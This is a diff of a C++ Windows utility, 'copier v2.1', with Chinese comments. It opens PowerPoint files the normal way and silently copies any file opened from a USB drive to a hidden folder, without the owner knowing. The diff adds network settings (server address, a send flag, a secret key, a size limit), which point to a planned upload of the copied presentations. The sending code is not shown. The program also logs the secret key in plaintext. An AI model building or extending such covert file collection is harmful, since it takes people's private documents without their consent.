@@ -2,58 +2,75 @@
 #include <string>
 #include <regex>
 #include <windows.h>
-#include <sys/stat.h> //stat
-#include <direct.h>   //_mkdir
-#include <stdarg.h>   //可变参数
+#include <direct.h> //_mkdir
+#include <cstdarg>  //可变参数
+#include "tools.h"
 #include "configparser/ini_parser.h"
 
 using namespace std;
+#define DEBUG_MODE true
 
 // 定义函数
 int conf();
-tm *get_tm();
+
 void log(const char *, ...);
-bool fileExists(const string &);
-bool isInUDisk(const string &);
-int copyFile(const string &, const string &);
-int getFilePathSplitByAbs(const string &, string &, int);
-string getFilePathSplitByAbs(const string &, int);
+
 HANDLE executePPTFile(const string &);
-string getExeFileAbsPath();
+
 void checkEnvironment_with1arg(int);
+
 void executeAndCopyFile_with2args(const string &);
 
 /* 配置变量 */
-bool LogMode;
-string PowerPointPath, CopyPath, IgnoreDisk;
-int retAll;
+int ConfigStatus, C_CopyFlush, C_MaxSendSize;
+bool C_LogMode, C_SendPPT;
+string C_PowerPointPath, C_CopyPath, C_IgnoreDisk, C_ServerAddr, C_SecretKey;
 
 /* 加载配置 */
 int conf()
 {
-    int read_ret;
-    IniParser iniparser;
-    read_ret = iniparser.read(getFilePathSplitByAbs(getExeFileAbsPath(), 1) + "copier.ini"); // 读
-    if (read_ret == 0)
-    {
-        read_ret |= iniparser.get_v_bool("copier", "LogMode", LogMode);                 // 1
-        read_ret |= iniparser.get_v_string("copier", "PowerPointPath", PowerPointPath); // 2
-        read_ret |= iniparser.get_v_string("copier", "CopyPath", CopyPath);             // 3
-        read_ret |= iniparser.get_v_string("copier", "IgnoreDisk", IgnoreDisk);         // 4
-    }
-    return read_ret;
-}
-
-tm *get_tm()
-{
-    time_t now;
-    time(&now);
-    return localtime(&now);
+    int ret_read;
+    IniParser ip;
+    // read
+    ret_read = ip.read(getFilePathSplitByAbs(getExeFileAbsPath(), 1).value() + "copier.ini");
+    rff<int>
+            R_CopyFlush = ip.get_v_int("copier", "CopyFlush", 1024),
+            R_MaxSendSize = ip.get_v_int("net_work", "MaxSendSize", -1);
+    rff<bool>
+            R_LogMode = ip.get_v_bool("copier", "LogMode", true),
+            R_SendPPT = ip.get_v_bool("net_work", "SendPPT", false);
+    rff<string>
+            R_PowerPointPath = ip.get_v_string("copier", "PowerPointPath"),
+            R_CopyPath = ip.get_v_string("copier", "CopyPath"),
+            R_IgnoreDisk = ip.get_v_string("copier", "IgnoreDisk"),
+            R_ServerAddr = ip.get_v_string("net_work", "ServerAddr"),
+            R_SecretKey = ip.get_v_string("net_work", "SecretKey");
+    // init
+    C_LogMode = ip.get_v_bool("copier", "LogMode", true).value();
+    C_PowerPointPath = R_PowerPointPath.value();
+    C_CopyPath = R_CopyPath.value();
+    C_IgnoreDisk = R_IgnoreDisk.value();
+    C_CopyFlush = R_CopyFlush.value();
+    //
+    C_ServerAddr = R_ServerAddr.value();
+    C_SendPPT = R_SendPPT.value();
+    C_SecretKey = R_SecretKey.value();
+    C_MaxSendSize = R_MaxSendSize.value();
+    // return
+    return ret_read
+           | R_LogMode.status()
+           | R_PowerPointPath.status()
+           | R_CopyPath.status()
+           | R_IgnoreDisk.status()
+           | R_CopyFlush.status()
+           | R_ServerAddr.status()
+           | R_SendPPT.status()
+           | R_SecretKey.status();
 }
 
 void log(const char *format, ...)
 {
-    if (LogMode)
+    if (C_LogMode)
     {
         tm *p = get_tm();
         // 输出时间
@@ -67,179 +84,50 @@ void log(const char *format, ...)
     }
 }
 
-/* 判断文件是否存在 */
-bool fileExists(const string &fp)
-{
-    struct stat buf;
-    return (stat(fp.c_str(), &buf) == 0); // == 0 代表读取文件状态成功 -> 文件存在
-}
-
-/* 判断文件是否在U盘 */
-bool isInUDisk(const string &fp)
-{
-    regex re_comma("((\\s*,\\s*)|(\\s*，\\s*))");
-    string disk = getFilePathSplitByAbs(fp, 2); // 当前文件的盘符
-    const sregex_token_iterator end;
-    for (sregex_token_iterator iter(IgnoreDisk.begin(), IgnoreDisk.end(), re_comma, -1); iter != end; iter++)
-    {
-        if (iter->str() == disk)
-        {
-            return false;
-        }
-    }
-    return true;
-}
-
-/* 二进制拷贝文件 */
-int copyFile(const string &fileA, const string &fileB)
-{
-    FILE *_in, *_out;
-    _in = fopen(fileA.c_str(), "rb");
-    if (!_in) // 打开失败
-    {
-        return 1;
-    }
-    _out = fopen(fileB.c_str(), "wb");
-    if (!_out) // 新建失败
-    {
-        fclose(_in);
-        return -1;
-    }
-    // 开始拷贝
-    const int FLUSH_NUM = 1024 * 1024; // 一次读 1 MB 数据
-    char flush[FLUSH_NUM];
-    memset(flush, 0, sizeof(flush));
-    int successNum;    // 成功读取的数量
-    while (!feof(_in)) // 如果 eof 了就不读了，代表文件已到尽头
-    {
-        successNum = (int)fread(flush, 1, FLUSH_NUM, _in);
-        fwrite(flush, 1, successNum, _out);
-    }
-    // 别忘了关闭文件
-    fclose(_in);
-    fclose(_out);
-    return 0;
-}
-
-/* 获取文件路径的一部分（分割）
- * 参数:
- *     filePath: 文件路径
- *                   必须是绝对的
- *     type:     获取的信息种类
- *                   0 代表全路径
- *                   1 代表文件夹名
- *                   2 代表盘符
- *                   3 代表文件名
- * 返回值:
- *     获取状态
- *     0 为成功，-1 为失败
- */
-int getFilePathSplitByAbs(const string &fileAbsPath, string &buf, int type)
-{
-    regex re_fpath_abs("(([A-Za-z])+:(?:.+)?[/\\\\])([^/\\\\:\\*\\?\"<>\\|]+)");
-    cmatch m;
-    if (type >= 0 && type <= 3 && regex_match(fileAbsPath.c_str(), m, re_fpath_abs))
-    {
-        buf = m.str(type);
-        return 0;
-    }
-    else
-    {
-        return -1;
-    }
-}
-
-/* 获取文件路径的一部分（分割）
- * 参数:
- *     filePath: 文件路径
- *                   必须是绝对的
- *     type:     获取的信息种类
- *                   0 代表全路径
- *                   1 代表文件夹名
- *                   2 代表盘符
- *                   3 代表文件名
- * 返回值:
- *     获取状态
- *     0 为成功，-1 为失败
- */
-string getFilePathSplitByAbs(const string &fileAbsPath, int type)
-{
-    regex re_fpath_abs("(([A-Za-z]):(?:.+)?[/\\\\])([^/\\\\:\\*\\?\"<>\\|]+)");
-    cmatch m;
-    if (type >= 0 && type <= 3 && regex_match(fileAbsPath.c_str(), m, re_fpath_abs))
-    {
-        return m.str(type);
-    }
-    else
-    {
-        return "";
-    }
-}
-
 /* 用PNT打开指定文件 */
 HANDLE executePPTFile(const string &f_path)
 {
-    string p1 = "\"", p2 = "\"";
-    p1.append(PowerPointPath);
-    p1.append("\"");
-    p2.append(f_path);
-    p2.append("\"");
     return ShellExecuteA(nullptr, "open",
-                         p1.c_str(),
-                         p2.c_str(),
+                         ("\"" + C_PowerPointPath + "\"").c_str(),
+                         ("\"" + f_path + "\"").c_str(),
                          nullptr, SW_SHOWNORMAL);
-}
-
-// 在这里P用没有！获取的是工作目录而不是exe文件目录
-/* 当前工作目录 */
-// string getWorkDir() {
-//     char buffer[MAX_PATH * 2];
-//     getcwd(buffer, MAX_PATH * 2);
-//     return buffer;
-// }
-
-/* 当前exe目录 */
-string getExeFileAbsPath()
-{
-    char buf[MAX_PATH * 2];
-    GetModuleFileNameA(nullptr, buf, MAX_PATH * 2);
-    return string(buf);
 }
 
 void checkEnvironment_with1arg(int argc)
 {
-    log("参数为 %d 个 (不是2个), 执行检查环境\n", argc);
+    log("参数为 %d 个 (不是 2 个), 执行检查环境\n", argc);
     // 康康 PNT 是否存在
-    if (fileExists(PowerPointPath))
+    if (fileExists(C_PowerPointPath))
     {
         log("环境正常！可以使用！\n");
-        MessageBoxA(nullptr, "环境正常！可以使用！", "copier v2.0--by XN & XY", MB_ICONINFORMATION);
+        MessageBoxW(nullptr, L"环境正常！可以使用！", L"copier v2.1--by XN & XY", MB_ICONINFORMATION);
     }
     else
     {
         log("未找到PowerPoint程序！请检查配置！\n");
-        MessageBoxA(nullptr, "未找到PowerPoint程序！\n请检查配置！", "copier v2.0--by XN & XY", MB_ICONERROR);
+        MessageBoxW(nullptr, L"未找到PowerPoint程序！\n请检查配置！", L"copier v2.1--by XN & XY", MB_ICONERROR);
     }
 }
 
 void executeAndCopyFile_with2args(const string &f_path)
 {
     // 有 2 个参数，打开（，再拷贝）
-    string f_name = getFilePathSplitByAbs(f_path, 3);
+    string f_name = getFilePathSplitByAbs(f_path, 3).value();
     log("参数为 2 个，执行文件操作\n");
     log("打开文件路径: %s\n", f_path.c_str());
     log("文件所在盘: %c\n", toupper(f_path[0]));
     log("文件名: %s\n", f_name.c_str());
     executePPTFile(f_path); // 打开文件
     // 判断是否在 U 盘
-    if (isInUDisk(f_path)) // 在U盘中，复制
+    if (isInUDisk(f_path, C_IgnoreDisk)) // 在U盘中，复制
     {
         log("这个文件 *在* U盘中，先打开再复制\n");
         log("创建文件夹状态: %d\n",
-            _mkdir(CopyPath.c_str())); // 创建文件夹，0 为原来不存在但创建成功，-1 为原来存在文件夹而不用创建
-        log("文件拷贝目标: %s%s\n", CopyPath.c_str(), getFilePathSplitByAbs(f_path, 3).c_str());
-        log("文件拷贝状态: %d\n",                                           // 复制文件
-            copyFile(f_path, CopyPath + getFilePathSplitByAbs(f_path, 3))); // 0 为正常，1 为找不到源文件，-1 为创建文件失败
+            _mkdir(C_CopyPath.c_str())); // 创建文件夹，0 为原来不存在但创建成功，-1 为原来存在文件夹而不用创建
+        log("文件拷贝目标: %s%s\n", C_CopyPath.c_str(), getFilePathSplitByAbs(f_path, 3).value().c_str());
+        log("文件拷贝状态: %d\n", // 复制文件
+            copyFile(f_path, C_CopyPath + getFilePathSplitByAbs(f_path, 3).value(),
+                     C_CopyFlush)); // 0 为正常，1 为找不到源文件，-1 为创建文件失败
     }
     else // 不在U盘中，不复制
     {
@@ -250,23 +138,41 @@ void executeAndCopyFile_with2args(const string &f_path)
 /* 主函数 */
 int main(int argc, char *argv[])
 {
+#ifdef DEBUG_MODE
+    system("chcp 65001");
+#endif
+    tm *p = get_tm();
+    printf("\n-------------------------copier v2.1 于 %04d/%02d/%02d %02d:%02d:%02d 启动-------------------------\n",
+           p->tm_year + 1900, p->tm_mon + 1, p->tm_mday, p->tm_hour, p->tm_min, p->tm_sec);
     // 配置文件读取
-    retAll = conf();
+    ConfigStatus = conf();
+#ifndef DEBUG_MODE
     if (LogMode)
     {
         // 重定向文件
         freopen((getFilePathSplitByAbs(getExeFileAbsPath(), 1) + "copier.log").c_str(), "a", stdout);
-        tm *p = get_tm();
-        printf("\n-------------------------copier v2.0 于 %04d/%02d/%02d %02d:%02d:%02d 启动-------------------------\n",
-               p->tm_year + 1900, p->tm_mon + 1, p->tm_mday, p->tm_hour, p->tm_min, p->tm_sec);
     }
+#endif
     log("EXE 路径: %s\n", getExeFileAbsPath().c_str());
-    log("工作目录: %s\n", getFilePathSplitByAbs(getExeFileAbsPath(), 1).c_str());
-    log("日志文件路径: %s\n", (getFilePathSplitByAbs(getExeFileAbsPath(), 1) + "copier.log").c_str());
-    log("配置文件路径: %s\n", (getFilePathSplitByAbs(getExeFileAbsPath(), 1) + "copier.ini").c_str());
-    log("配置状态: %d\n", retAll); // 0 为正常，-1 为读取配置文件异常
-    log("配置信息如下: \n    LogMode = %d\n    PowerPointPath = %s\n    CopyPath = %s\n    IgnoreDisk = %s\n",
-        LogMode, PowerPointPath.c_str(), CopyPath.c_str(), IgnoreDisk.c_str());
+    log("工作目录: %s\n", getFilePathSplitByAbs(getExeFileAbsPath(), 1).value().c_str());
+    log("日志文件路径: %s\n", (getFilePathSplitByAbs(getExeFileAbsPath(), 1).value() + "copier.log").c_str());
+    log("配置文件路径: %s\n", (getFilePathSplitByAbs(getExeFileAbsPath(), 1).value() + "copier.ini").c_str());
+    log("配置状态: %d\n", ConfigStatus); // 0 为正常，-1 为读取配置文件异常
+    log(R"(配置信息如下:
+    [copier]
+        LogMode = %d
+        PowerPointPath = "%s"
+        CopyPath = "%s"
+        IgnoreDisk = "%s"
+        CopyFlush = %d
+    [net_work]
+        ServerAddr = "%s"
+        SendPPT = %d
+        SecretKey = "%s"
+        MaxSendSize = %d
+)",
+        C_LogMode, C_PowerPointPath.c_str(), C_CopyPath.c_str(), C_IgnoreDisk.c_str(), C_CopyFlush,
+        C_ServerAddr.c_str(), C_SendPPT, C_SecretKey.c_str(), C_MaxSendSize);
 
     // 干正事
     if (argc == 2)
@@ -278,10 +184,12 @@ int main(int argc, char *argv[])
         checkEnvironment_with1arg(argc);
     }
     log("程序正常退出\n");
+#ifndef DEBUG_MODE
     if (LogMode)
     {
         fclose(stdout);
     }
+#endif
     // 好习惯
     return 0;
 }
